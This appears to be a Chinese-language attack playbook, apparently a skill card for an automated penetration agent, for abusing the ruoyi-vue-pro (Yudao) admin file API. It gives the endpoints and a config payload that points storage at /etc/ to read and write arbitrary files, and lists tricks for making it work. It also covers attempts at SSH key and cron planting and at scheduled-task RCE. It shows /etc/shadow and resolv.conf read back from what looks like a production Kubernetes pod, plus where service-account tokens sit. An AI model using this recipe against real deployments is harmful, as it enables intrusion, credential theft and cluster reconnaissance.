# 芋道（ruoyi-vue-pro）`/infra/file` 现成配方

对照 `references/` 里本卡 SKILL.md 的通用纪律；此处只放芋道实测表单。

## 1. 端点

| 动作 | 请求 |
|---|---|
| 列配置 | `GET /admin-api/infra/file-config/page?pageNo=1&pageSize=5` |
| 建配置 | `POST /admin-api/infra/file-config/create` |
| 改配置 | `PUT /admin-api/infra/file-config/update` |
| 上传 | `POST /admin-api/infra/file/upload`（multipart，字段名 `file`） |
| 读回 | `GET /admin-api/infra/file/{id}/get/{单段文件名}` |

带 `Authorization: Bearer <票>` + `tenant-id: <租户>`；芋道信封 = `{"code":..,"data":..,"message":..}`。

```json
// create/update 体（storage=10 即本地档）
{"id":18,"name":"zz_fs","storage":10,
 "config":{"basePath":"/etc/","domain":"http://zz.local"},"remark":"p"}
```

## 2. 三个必踩的坑

1. **`domain` 必填**。缺它时 `update` 被静默拒：接口回成功、`basePath` 一字未改。
   历史上表现为「写入矩阵全 `code:0`、文件名全同」。⇒ 写完立刻 `page` 读回比对。
2. **配置按 configId 缓存**：`update` 老 id 未必即时生效。要换目录就 **create 一个新 config**
   并记住新 id，读写都用新 id。
3. **读名字必须单段**：多段名（带 `/`）被 Tomcat 先拦成 `404` ⇒ `basePath` 指目录、
   `name` 只给文件名。

## 3. 写入名

`/infra/file/upload` 落盘名 = **`<md5(内容)>.<扩展名>`**（扩展名来自上传文件名）。
⇒ 精确文件名落点（`authorized_keys`、`application.yaml`、`/etc/cron.d/x`）不可用。
拿名字：看上传响应的 `data`（含 `.../infra/file/{id}/get/<md5>.ext`）。

## 4. 定时任务面：芋道上不走 EL

```java
// JobHandlerInvoker
JobHandler jobHandler = applicationContext.getBean(jobHandlerName, JobHandler.class);
return jobHandler.execute(jobHandlerParam);
```

- 芋道**没有 `JobInvokeUtil`**，handlerName 必须是**实现 `JobHandler` 的 Spring bean**；
- 因此 `javax/jakarta.el.ELProcessor.eval` 之类 handlerName **建单回 `code:0`（伪成功）**，
  每次触发抛 `NoSuchBeanDefinitionException`，**永远不会有文件落地**；
- ⇒ **EL 定时任务 RCE 只对 RuoYi 系成立，对芋道不成立**。别在这条线上投轮次，
  回去打文件原语或找真正的 `JobHandler` bean。
- 反向：想确认「job 到底有没有执行」，就用文件读原语回读它本该写出的落地物；
  读回 `500`（不存在）＝ 没执行，别当成「读不通」。

## 5. `/infra/*` 面判读（实测分层，随部署变化）

| 路由 | 实测 |
|---|---|
| `/infra/file-config/{page,create,update}`、`/infra/file/upload`、`/infra/file/{id}/get/*` | 通 |
| `/infra/config/page`、`/infra/codegen/table/page` | 通 |
| `/infra/codegen/db/table/list`、`/infra/redis/get-monitor-info` | `403「没有该操作权限」`＝权限门 |
| `/infra/data-source/*`、`/infra/db-doc/*` | `404`＝模块未注册 |

⇒ `403` 可用可逆的菜单/角色授权补开再打；`404` 直接换面。
缺 `data-source` 模块 ⇒ **没有可控 JDBC URL** ⇒ 恶意 MySQL/PG 反序列化那条反射 RCE 不存在。

## 6. 回读出来的环境（判 Pod / root / 集群）

```text
/etc/hostname  → saas-infra-api-prod-<rs>-<pod>       ⇒ K8s Pod
/etc/shadow    → root:!::0:::::                        ⇒ 容器内 root
/etc/resolv.conf → nameserver 192.168.0.10
                   search <ns>.svc.cluster.local       ⇒ Service CIDR 192.168.0.0/16
⇒ K8s API = 192.168.0.1:6443（kubernetes.default.svc），仅集群内可达
/var/run/secrets/kubernetes.io/serviceaccount/{token,namespace,ca.crt} ⇒ SA 凭据
```

**结论口径**：SA token 无公网 API 出口 = **零收益**；要它值钱必须先在 Pod 内执行代码。
别把「拿到 token」写进战果当集群接管。
